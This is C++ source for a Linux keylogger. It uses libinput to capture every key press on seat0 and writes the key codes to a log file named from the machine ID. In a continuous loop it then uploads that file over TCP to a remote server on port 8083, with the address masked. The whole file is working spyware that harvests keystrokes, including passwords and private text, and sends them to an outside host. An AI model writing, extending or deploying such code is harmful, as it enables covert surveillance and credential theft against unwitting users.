#include <boost/asio.hpp>
#include <iostream>
#include <chrono>
#include <thread>
#include <memory>
#include <array>
#include <fstream>
#include <sstream>
#include <future>
#include <libinput.h>
#include <unistd.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/types.h>

using namespace boost::asio;

class Poll{

static int open_restricted(const char *path, int flags, void *user_data)
{
        int fd = open(path, flags);
        return fd < 0 ? -errno : fd;
}
 
static void close_restricted(int fd, void *user_data)
{
        close(fd);
}
 
constexpr static struct libinput_interface interface = {
        .open_restricted = open_restricted,
        .close_restricted = close_restricted,
};

     udev* udev_t;
     libinput* input;
     libinput_event* event;
     std::ofstream ofs;
     const int maxCount;
     int currentCount;
     int fd;

     
        public:

Poll(std::string filename) : udev_t(udev_new()),input(libinput_udev_create_context(&interface,nullptr,udev_t)),ofs(filename,std::ios::binary | std::ios::app),maxCount(100),currentCount(0),fd(libinput_get_fd(input)){
libinput_udev_assign_seat(input,"seat0");
}
~Poll(){
    libinput_unref(input);
}

        void polling(){
    while(!(currentCount >= maxCount)){
         fd_set fs;
         FD_ZERO(&fs);
         FD_SET(fd,&fs);  
         int res = select(fd + 1,&fs,nullptr,nullptr,nullptr);

        libinput_dispatch(input);
          while((event = libinput_get_event(input)) != NULL && res){
                if(libinput_event_get_type(event) == LIBINPUT_EVENT_KEYBOARD_KEY){
                        libinput_event_keyboard* keybord = libinput_event_get_keyboard_event(event);
                        if(libinput_event_keyboard_get_key_state(keybord) == LIBINPUT_KEY_STATE_PRESSED){
                                int i = libinput_event_keyboard_get_key(keybord);
                                ++currentCount;
                                std::cout << i << std::endl;
                                ofs << i << ' ' << std::flush;
                        }
                }
                libinput_event_destroy(event);
          }
     }
}

};


struct fileInfo{
size_t filesize;
std::string filename;
};

class socketHost{
std::string buffer_;

void clearBuffer(){
    buffer_.clear();
    buffer_.resize(3);
}

public:
socketHost(io_context& io,std::string address,int port) : end(ip::address::from_string(std::string(address)),port),sock(io),buffer_(""){
sock.connect(end,code);
if(code){
std::cout << "есть ошибка с подключением" << std::endl;
throw(std::runtime_error(code.what()));
}
}

void write(fileInfo& request){
    std::stringstream ss;
    ss << "fileInfo " << request.filename << ' ' << request.filesize;
    buffer_ = std::move(ss.str());
    boost::asio::write(sock,buffer(buffer_.c_str(),buffer_.length()));
    clearBuffer();
}

void write (char* data,int size){
boost::asio::write(sock,buffer(data,size));
 clearBuffer();
}

void wait(){
    sock.wait(sock.wait_read);
}

void read(){
    sock.read_some(buffer(buffer_));
    std::cout << buffer_ << std::endl;
}

auto getData() -> decltype(buffer_.c_str()){
    return buffer_.c_str();
}

private:
ip::tcp::endpoint end;
ip::tcp::socket sock;
boost::system::error_code code;

};

void read_file(fileInfo* infoFile,std::vector<char>* buffer,std::string& filename){
std::ifstream ifs(filename,std::ios::binary | std::ios::ate);
if(!ifs.is_open()) throw std::runtime_error("файл не открылся");
int sizeFile = ifs.tellg();
buffer->resize(sizeFile);
ifs.seekg(0);
if(!ifs.read(buffer->data(),sizeFile)){
    std::cout << "ошибка в чтении в буффер" << std::endl;
}

infoFile->filename = filename;
infoFile->filesize = sizeFile;
}

void sendToServer(std::string filename){
fileInfo info;
std::vector<char> buffer;
read_file(&info,&buffer,filename);

io_context io;
socketHost socket(io,"xxx.xxx.xxx.xxx",8083);
std::cout << "отправление метаданных на сервер" << std::endl;
socket.write(info);
socket.wait();
socket.read();
if(strcmp(socket.getData(),"OK") != 0){
    std::cout << "error" << std::endl;
    exit(66);
}
std::cout << "все выполнилось хорошо" << std::endl;
socket.write(buffer.data(),buffer.size());
socket.wait();
socket.read();
if(strcmp(socket.getData(),"EOF") != 0){
    std::cout << "error" << std::endl;
    exit(66);
}
std::cout << "все выполнилось хорошо сервер сообщил о успешной передаче" << std::endl;
}

enum class Actions {READING,SENDING};

int main(){
    Actions currentAct = Actions::READING;
    std::string MachineID;
    std::ifstream ifs("/etc/machine-id");
    ifs >> MachineID;

    while(1){
std::string indef(MachineID.begin() ,MachineID.begin() + 5);
std::string fileName("logger" + indef);

if(currentAct ==  Actions::READING){
Poll po(fileName);
po.polling();
currentAct = Actions::SENDING;
}else if(currentAct == Actions::SENDING){
sendToServer(fileName);
currentAct = Actions::READING;
}
}
}